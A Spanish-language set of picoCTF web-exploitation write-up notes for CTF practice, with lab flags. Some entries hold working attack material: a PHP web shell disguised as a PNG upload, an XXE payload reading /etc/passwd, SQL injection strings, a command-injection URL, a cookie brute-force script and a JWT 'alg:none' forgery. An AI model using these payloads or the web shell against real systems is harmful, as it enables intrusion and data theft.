@@ -1,0 +1,586 @@
+picoCTF Web_Explotation
+
+
+------------
+|| easy   ||
+------------
+
+
+1 -------------------------------------------------------Inspect HTML
+
+
+solo tenemos que buscar en el Html, esta como un comentario
+
+
+
+
+2 ------------------------------------------------------Insp3ct0r
+
+
+Tenemos que revisar el inspector, para encontrar las partes de la flag
+
+
+
+
+3 ------------------------------------------------------Unminify
+
+
+toca mirar el inspector para encontrarla, solo es desplegar el html
+
+
+
+
+4 -------------------------------------------------------Includes
+
+
+solo tenemos que buscar en los archivos de la web, y completar la flag
+
+
+
+
+5 -------------------------------------------------------WebDecode
+
+
+consiste en mirar algo sospechoso en una pagina web, lo que hay es una cadena de
+caracteres muy grande y sin sentido en la sección about y al intentar decodificar con base 64, notamos que es la flag
+
+
+
+
+6 ------------------------------------------------------Where are the robots
+
+
+tenemos que entrar a el archivo de configuración robots.txt y después
+tenemos que entrar a la path que nos indica el robots y allí encontraremos
+la flag
+
+
+
+
+7 -------------------------------------------------------Local Autority
+
+
+tenemos que analizar los archivos que se generan en cada momento de la ejecución
+cuando ingresamos un usuario random, etc. y ahi encontraremos un js que nos muestra
+la verificación y las credenciales
+
+
+
+
+8 ------------------------------------------------------Logon
+
+
+tenemos que revisar las cookies y modificar la correcta, para poder tener session de
+admin y acceder al sistema
+
+interesante
+
+
+
+
+9 ------------------------------------------------------Don't-Use-Client-Side
+
+
+tenemos que entender el el js detrás de la pagina, donde la contraseña se encuentra en
+la misma verificación de esta
+
+
+
+
+10 -------------------------------------------------------GET aHEAD
+
+
+Lo primero que hicimos fue conectar el proxy de burp y conectar nuestro navegador
+
+ingresamos a la web y en la pagina, capturamos el trafico, colocamos ctrl + r y en el Repeat,
+cambiamos el metodo en la captura de GET a HEAD
+
+
+
+
+11 -------------------------------------------------------IntroToBurp
+
+
+Lo primero que hicimos fue conectar el proxy de burp y conectar nuestro navegador
+
+posteriormente ingresamos datos random en el login, mientras se esta capturando el trafico, utilizamos forward para enviar la petición, si no esta se queda capturada
+
+llegamos a la parte de opt, donde este parámetro se envía en texto plano, colocamos ctrl + r para utilizar Repeat, modificamos la petición
+eliminando el campo de opt y obtenemos así la flag
+
+
+
+
+
+10 -------------------------------------------------------Bookmarklet
+
+
+en el código fuente obtendremos una alert que muestra la clave descifrada y también
+se puede tomar el código y compilarlo en el navegador o un archivo aparte
+
+
+        javascript:(function() {
+            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓË¨ËÓ§Èí";
+            var key = "picoctf";
+            var decryptedFlag = "";
+            for (var i = 0; i < encryptedFlag.length; i++) {
+                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
+            }
+            alert(decryptedFlag);
+        })();
+    
+
+ parece ser una variante de cifrado XOR
+
+
+
+
+11 -------------------------------------------------------Cookies
+
+
+
+Notamos que en la pagina podemos alterar la cookie y nos muestra una web de acuerdo
+a la cookie que esta actualmente, entonces podemos con el siguiente código, enviarle una
+cookie distinta hasta encontrar el código de regreso que contenga la frase 'picoCTF'
+
+#!/bin/python3
+import requests
+
+for i in range(25):
+    cookie = 'name={}'.format(i)
+    headers = {'Cookie': cookie}
+
+    r = requests.get('http://mercury.picoctf.net:17781/check', headers=headers)
+    if r.status_code == 200 and 'picoCTF' in r.text:
+        print(r.text)
+
+
+explicación:
+
+Importa el módulo requests: Permite hacer solicitudes HTTP de manera sencilla.
+
+Bucle for: Itera desde 0 hasta 24 (25 iteraciones en total).
+
+Generación de cookies: En cada iteración, crea una cadena de texto que representa una 
+cookie con el formato name=i, donde i es el número de la iteración actual.
+
+Establecimiento de encabezados: Define un diccionario headers que incluye la cookie generada.
+
+Solicitud HTTP GET: Envía una solicitud a la URL http://mercury.picoctf.net:17781/check 
+con los encabezados que contienen la cookie.
+
+Verificación de la respuesta: Después de enviar la solicitud, comprueba si el código de
+estado de la respuesta es 200 (lo que indica que la solicitud fue exitosa) y si el texto
+de la respuesta contiene la cadena 'picoCTF'.
+
+Impresión del resultado: Si ambas condiciones se cumplen, imprime el contenido de la respuesta.
+
+
+
+
+12 ------------------------------------------------------Scavenger Hunt
+
+
+
+html
+css
+js -> pista
+
+
+robot.txt
+
+El archivo robots.txt es un archivo de texto que se utiliza para dar instrucciones a los robots
+de los motores de búsqueda sobre cómo deben interactuar con un sitio web.
+
+
+
+.htacces
+
+El archivo .htaccess es un archivo de configuración utilizado por el servidor web Apache. 
+Permite realizar ajustes de configuración a nivel de directorio sin necesidad de modificar 
+el archivo principal de configuración del servidor.
+
+
+
+.DS_Store
+
+El archivo .DS_Store (Desktop Services Store) es un archivo creado automáticamente por el 
+sistema operativo macOS. Su propósito principal es almacenar metadatos sobre cómo se deben 
+mostrar las carpetas en el Finder de macOS.
+
+
+
+picoCTF{th4ts_4_l0t_0f_pl4c3s_2_lO0k_7a46d25d}
+
+
+
+
+
+
+
+------------
+|| medium ||
+------------
+
+
+1p-------------------------------------------------------Trickster
+
+Nos encontramos con un sistema para subir archivos a un proyecto
+
+	Podemos mirar a partir de burpsuite podemos observar que el archivo PNG se pasa en 	
+	texto limpio, solo validando su formato
+
+	Aquí entendemos que podemos infiltrar un archivo cambiándole su cabecera a la de un 	
+	PNG
+
+	entonces procedemos a crear un archivo con cabecera PNG
+	que seria: 89 50 4E 47 0D 0A 1A 0A
+
+Tambien caemos en cuenta que en este archivo podemos agregar un malware que nos retorne una 
+shell como el siguiente:
+
+	<html>
+	<body>
+	<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+	<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
+	<input type="SUBMIT" value="Execute">
+	</form>
+	<pre>
+	<?php
+
+
+
+--------------------------------------------------------
+	    if(isset($_GET['cmd']))
+	    {
+	        system($_GET['cmd']);
+
+------------------------------------------------------------
+	    }
+	?>
+	</pre>
+	</body>
+	</html>
+
+	Para finalizar el dizfras podemos cambiar la cabecera con ghex y guargar el archivo 
+	con la extesion:	.png.php
+
+Ahora para saber como accedemos a el archivo ya arriba de la pagina web, podemos mirar en 
+	el archivo: robot.txt
+
+	Aquí encontramos que existe un directorio conocido como /uploads/
+
+entonces podemos subir el archivo a traves de nuestra web: 
+		http://<nuesta web>/uploads/<archivo maliciosos>
+
+	esto nos desplegara la bash y podemos consultarla
+	con el comando ls, vemos que la unica salida es el directorio acutal(vacio) 
+	y el anterior, donde no podemos acceder
+
+Entonces podemos intentar listar el directorio anterior con ls ..
+	Al notar que podemos acceder, revisamos cada archivo con: cat ../<archivo> 
+	
+
+
+
+2p-------------------------------------------------------SOAP
+
+Encontramos un sitio web, el cual no tiene muy protegido su servidor, esto se puede observar en el html, 
+conde tiene datos como id's y archivos descubiertos:
+
+Entonces al analizar con burp suite, podemos darnos de cuenta que se puede hacer una 
+injection de XML que es un formato parecido a html, pero que permite ingresar variables en etiquetas, 
+en este caso se utiliza para enviar ID's y obtener una respuesta en data
+
+Capturamos la petición POST y inyectamos la siguiente inyección 
+
+
+POST /data HTTP/1.1
+Host: saturn.picoctf.net:60161
+Content-Length: 134
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 
+		Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
+Content-Type: application/xml
+Accept: */*
+Origin: http://saturn.picoctf.net:60161
+Referer: http://saturn.picoctf.net:60161/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
+Connection: keep-alive
+
+
+
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<data>
+    <ID>&ent;</ID>
+</data>
+
+
+Posteriormente recibimos como respuesta, los directorios y la flag del server
+
+
+
+
+3p-------------------------------------------------------More SQLi
+
+
+Tenemos un logins que al ingresar usuario nos muestra el formato de la consulta
+la cual es:
+SELECT id FROM users WHERE password = '' AND username = ''
+lo que nos indica que podemos usar una inyección simple en la password inhabilitando 
+el usuario y trayendo toda la información
+
+' OR '1'='1' --
+
+Vemos que nos trae una información en una tabla
+
+Ahora vamos a interceptar en burpsuite la solicitud y con ctrl + r enviamos la consulta 
+con los campos cambiados y obtenemos la flag
+
+
+
+
+4p-------------------------------------------------------MatchTheRegex
+
+
+Tenemos que revisar el inspector, hay una función encargada de validar que la cadena sea valida
+en la parte de abajo de la validación nos da una pista que es mas que suficiente para completar 
+el nivel y saber cual es el input
+
+
+
+
+5p-------------------------------------------------------Java Code Analysis!?! (Pendiente)
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9  = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
+
+eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTcyOTIzMDMwNCwiaWF0IjoxNzI4NjI1NTA0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9    
+=
+{"role":"Free","iss":"bookshelf","exp":1729230304,"iat":1728625504,"userId":1,"email":"user"}
+
+
+DCZ_H_hSllxjOrGTbmJX7vC1_vdkwSK5HZ9ptdBTnVM   = esta el la firma
+
+Todo cambia en cada petición, toca cambiar todo de acuerdo a el JWT que nos asigne la pagina
+
+
+revisar como modificar bien un token con JWT
+
+
+
+
+6p-------------------------------------------------------Findme
+
+
+Utilizamos burpsuite para interceptar las path que se cargan al ingresar el usuario test y la 
+	password test! donde encontramos uno id= que parecen estar encriptar y 
+	al desencriptar vemos la flag 
+
+service/news/feed/pages/weblayout
+
+/next-page/id=cGljb0NURntwcm94aWVzX2Fs      =    picoCTF{proxies_al
+
+/service/news/feed/pages/weblayout
+
+/next-page/id=bF90aGVfd2F5XzI1YmJhZTlhfQ==                =     l_the_way_25bbae9a}
+
+/home
+
+/autofillservice/core/page/-8103932986772744069/7469725614099232633
+
+
+picoCTF{proxies_all_the_way_25bbae9a}
+
+
+
+
+7p-------------------------------------------------------SQLiLite
+
+
+SQL query: SELECT * FROM users WHERE name='algo' AND password='algo'
+
+name = ' OR '1' = '1' --
+password = cualquier cosa 
+
+la flag este en el inspector: Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}
+
+esta es la sentencia SQL
+intentemos hacerle una inyeccion
+
+
+
+
+8p-------------------------------------------------------SQL Direct
+
+
+Entramos a la BD:
+	con \l: Vemos las bds
+	con \c <nombre_BD>: Ingresamos a una bd
+	\dt: Listamos las tablas
+	SELECT * FROM "flags": Listar el contenido de mi tabla
+
+
+
+
+9p-------------------------------------------------------Secrets
+
+
+Para dividir mi diccionario:
+sudo awk 'NR > 10000' /usr/share/wordlists/rockyou.txt > /ruta/donde/tengas/permisos/mitad_rockyou.txt
+
+Buscar directorios con
+gobuster dir -u http://saturn.picoctf.net:53363 -w /usr/share/wordlists/rockyou.txt
+
+directorios: /secret/hidden/superhidden
+colocamos # en el final para que muestre todos los archivos 
+
+buscamos en el inspector la flag
+
+
+
+
+10p-------------------------------------------------------Search Source
+
+
+tenemos que revisar el source de mi app y filtramos en cada archivo con ctrl + f
+la palabra pico y asi encontramos la flag
+
+
+
+
+11p-------------------------------------------------------Power Cookie
+
+
+Utilizo burp para interceptar el envió de la validación de usuario que crea la cookie y le 
+cmaibo el valor a 1 y obtengo la flag
+
+
+
+
+12p-------------------------------------------------------JAuth (Pendiente)
+
+
+Tengo que robar lo cookie y modificarla pero no se ha dejado :v
+
+
+{"typ":"JWT","alg":"none"}
+
+{"auth":1728998758783,"agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
+AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36","role":"admin","iat":1728998759}
+
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0K.eyJhdXRoIjoxNzI4OTk4NzU4NzgzLCJhZ2VudCI6Ik1veml
+sbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUw
+sIGxpa2UgR2Vja28pIENocm9tZS8xMjkuMC4wLjAgU2FmYXJpLzUzNy4zNiIsInJvbGUiOiJhZG1pbiIsIml
+hdCI6MTcyODk5ODc1OX0K
+
+
+
+
+13p-------------------------------------------------------caas
+
+
+Tenemos que enviar un comando después de el mensaje que va a reescribir en el código
+entonces colocamos mensaje;comando  esto es posible ya que el código esta escapando comandos
+entonces colocamos 
+https://caas.mars.picoctf.net/cowsay/execu;ls
+https://caas.mars.picoctf.net/cowsay/execu;cat%20falg.txt
+
+
+
+
+14p-------------------------------------------------------Login
+
+
+Tenemos que revisar en source, la verificación de usuario y contraseña y ahi encontramos 
+los input y ahi encontramos la flag
+
+
+
+
+
+15p-------------------------------------------------------Web Gauntlet
+
+
+ingresamos un usuario u nos arroja una consulta sql y tenemos que hacerle injecciones
+consiste en que debemos probar difrentes injecciones a la misma consulta y asi poder ingresar
+
+
+
+
+16p-------------------------------------------------------Web Gauntlet2
+
+
+
+username: ad'||'min
+password: a' IS NOT 'b
+
+
+
+
+
+
+17p-------------------------------------------------------Some Assembly Required 1
+
+
+Tenemos que revisar el source y allí encontra un js que hace la validación. además encontramos una path, al colocarla en la url del sitio, nos descarga un archivo y 
+encontramos la flag
+
+
+
+
+18p-------------------------------------------------------Who are you?
+
+
+tenemos que ir cambiando los atributos de la petición http, según corresponda
+donde cambiamos el user-agent, que es en navegador,
+la url de proveniencia, el lenguaje que acepta, la ubicación y la fecha
+todo nos lo va indicando el texto del gif
+
+
+
+
+-------------------------------------------------------Irish-Name-Repo 1
+
+Tenemos que hacer una inyección sql básica
+
+
+
+
+-------------------------------------------------------Client-side-again
+
+
+tenemos que buscar en el archivo de validación y encontramos la flag segmentada
+picoCTF{not_this_again_ef49bf}
+
+
+
+
+-------------------------------------------------------Irish-Name-Repo 2
+
+
+tenemos que hacer una injeccion sql basica:
+username: ad'||'min
+password: a' IS NOT 'b
+
+
+
+
+-------------------------------------------------------Picobrowser
+
+
+Tenemos que cambiar el user agent de nuestra petición por picobrowser
+
+
+
+
+-------------------------------------------------------
+
+-------------------------------------------------------
+
+-------------------------------------------------------
+
+
+eyJ0eXAiOiJKV1QiLCJhZG1pbiI6Im5vbmUifQo=.eyJ1c2VyIjoiYWRtaW4ifQo=.wCH5KShrIrBVKmnoosGad6diLO5dftlQvJkfu8Zaz0M
